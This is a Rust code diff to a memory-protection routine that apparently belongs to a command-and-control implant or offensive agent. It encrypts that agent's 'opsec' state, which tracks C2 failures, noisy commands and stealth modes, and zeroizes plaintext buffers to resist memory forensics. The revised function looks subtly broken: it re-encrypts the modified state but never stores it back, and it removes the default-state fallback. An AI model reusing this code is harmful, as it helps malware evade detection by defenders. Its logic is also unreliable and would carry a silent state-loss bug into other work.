@@ -103,49 +103,24 @@ impl MemoryProtector {
     }
 
     //  Mutable access with immediate cleanup
-    pub fn with_opsec_state_mut<F, R>(&mut self, f: &F) -> Result<R, Box<dyn std::error::Error>>
-    where F: Fn(&mut crate::opsec::OpsecState) -> R,
+    pub fn with_opsec_state_mut<F, R>(&mut self, f: F) -> Result<R>
     {
-        let mut state = if let Some((nonce, ciphertext)) = &self.encrypted_opsec_state {
-            let decrypted = self.protector.decrypt(nonce, ciphertext)?;
-            bincode::deserialize(&decrypted)?
-        } else {
-            // CREATE PROPER DEFAULT STATE WITH ALL FIELDS
-            crate::opsec::OpsecState {
-                mode: crate::opsec::AgentMode::FullOpsec,
-                current_score: 100.0,
-                consecutive_c2_failures: 0,
-                dynamic_max_c2_failures: 5,
-                dynamic_threshold_initialized: false,
-                last_noisy_command_time: None,
-                last_transition: std::time::SystemTime::now()
-                    .duration_since(std::time::UNIX_EPOCH)
-                    .unwrap_or_default()
-                    .as_secs(),
-                last_c2_threshold_adjustment: std::time::SystemTime::now()
-                    .duration_since(std::time::UNIX_EPOCH)
-                    .unwrap_or_default()
-                    .as_secs(),
-                // === ADD MISSING DYNAMIC THRESHOLD FIELDS ===
-                dyn_enter_full: 60.0,           // Default from config
-                dyn_exit_full: 55.0,            // Default with hysteresis buffer
-                dyn_enter_reduced: 20.0,        // Default from config 
-                dyn_exit_reduced: 15.0,         // Default with hysteresis buffer
-                threshold_adjustment_history: 0,
-            }
-        };
+        let (nonce, ciphertext) = self.encrypted_opsec_state.as_ref().ok_or("No encrypted OPSEC state found")?;
+        let mut decrypted_bytes = self.protector.decrypt(nonce, ciphertext)?;
+        let mut state: crate::opsec::OpsecState = bincode::deserialize(&decrypted_bytes)?;
+        
+        //  FIX: Immediately zeroize decryption buffer
+        decrypted_bytes.zeroize();
         
         let result = f(&mut state);
         
-        // Re-encrypt the modified state
-        let serialized = bincode::serialize(&state)?;
-        let (nonce, ciphertext) = self.protector.encrypt(&serialized)?;
-        self.encrypted_opsec_state = Some((nonce, ciphertext));
+        let mut serialized_bytes = bincode::serialize(&state)?;
+        let (nonce, ciphertext) = self.protector.encrypt(&serialized_bytes)?;
         
-        // Immediately zeroize plaintext
+        //  FIX: Immediately zeroize serialization buffer
+        serialized_bytes.zeroize();
+        
         state.zeroize();
-        std::mem::drop(state);
-        
         Ok(result)
     }
 
